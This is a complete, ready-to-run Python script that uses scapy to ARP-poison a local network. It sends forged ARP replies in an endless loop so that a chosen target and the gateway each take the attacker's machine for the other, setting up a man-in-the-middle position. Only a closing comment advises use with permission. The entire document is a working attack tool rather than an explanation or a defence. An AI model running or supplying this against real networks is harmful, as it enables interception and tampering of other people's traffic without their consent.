import scapy
from scapy.all import ARP, Ether, sendp, srp, conf
def arp_poison(target_ip, gateway_ip):
    # Create ARP response for target IP
    arp_response_target = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwsrc=conf.iface.hwaddr)
    
    # Create ARP response for gateway IP
    arp_response_gateway = ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwsrc=conf.iface.hwaddr)
    
    # Send the ARP responses
    sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/arp_response_target, verbose=False)
    sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/arp_response_gateway, verbose=False)

def main():
    target_ip = input("Enter the target IP address: ")
    gateway_ip = input("Enter the gateway IP address: ")
    
    print(f"Poisoning {target_ip} to think you are the gateway {gateway_ip}...")
    print(f"Poisoning {gateway_ip} to think you are the target {target_ip}...")
    
    try:
        while True:
            arp_poison(target_ip, gateway_ip)
    except KeyboardInterrupt:
        print("\nARP poisoning stopped.")
if __name__ == "__main__":
    main()
# This script performs ARP poisoning to redirect traffic between a target and a gateway.
# It sends ARP responses to both the target and the gateway, making them believe that the attacker's machine is the other.
# Note: This script requires root privileges to run.
# Use with caution and only on networks where you have permission to perform such actions.